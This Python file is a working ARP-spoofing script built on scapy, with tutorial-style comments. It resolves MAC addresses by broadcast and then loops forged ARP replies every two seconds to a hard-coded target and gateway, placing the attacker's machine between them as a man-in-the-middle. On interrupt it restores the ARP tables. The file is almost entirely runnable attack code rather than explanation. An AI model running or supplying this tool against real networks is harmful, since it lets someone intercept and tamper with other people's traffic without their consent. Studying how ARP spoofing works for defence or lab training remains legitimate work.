import scapy.all as scapy
import time
import sys
import optparse


# def get_arguments():
#     parser = optparse.OptionParser()
#     parser.add_option("-t", "--target", dest="target_ip", help="Target IP / IP range")
#     parser.add_option("-g", "--gateway", dest="gateway_ip", help="Gateway IP")
#     options = parser.parse_args()
#     return options


def get_mac(ip):

    # Here, we are creating an ARP request ourselves to ask who has the specific IP we asked for.
    arp_request = scapy.ARP(pdst=ip)

    # Here, we are setting our destination MAC to broadcast MAC address to make sure
    # it is sent to all the clients who are on the same network
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    # This variable is your packet that will be sent across the network, as it contains information about MAc and ARP
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose = False)[0]
    # srp stands for send and receive packet.

    return answered_list[0][1].hwsrc


# In our packet, op is 2 because op=1 means a request whereas we don't want a request.
# What we want is a response for which op=2
# Also in the below line what we have done is crafted a response for the victim saying my machine is the router
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac=get_mac(source_ip)
    packet = scapy.ARP(op=2,pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


# options = get_arguments()
target_ip = "192.168.1.130"
gateway_ip = "192.168.1.1"


sent_packets_count = 0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r packets sent: " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\nDetected CTRL + C .....Resetting ARP tables.......Please Wait")
    restore(target_ip, gateway_ip)
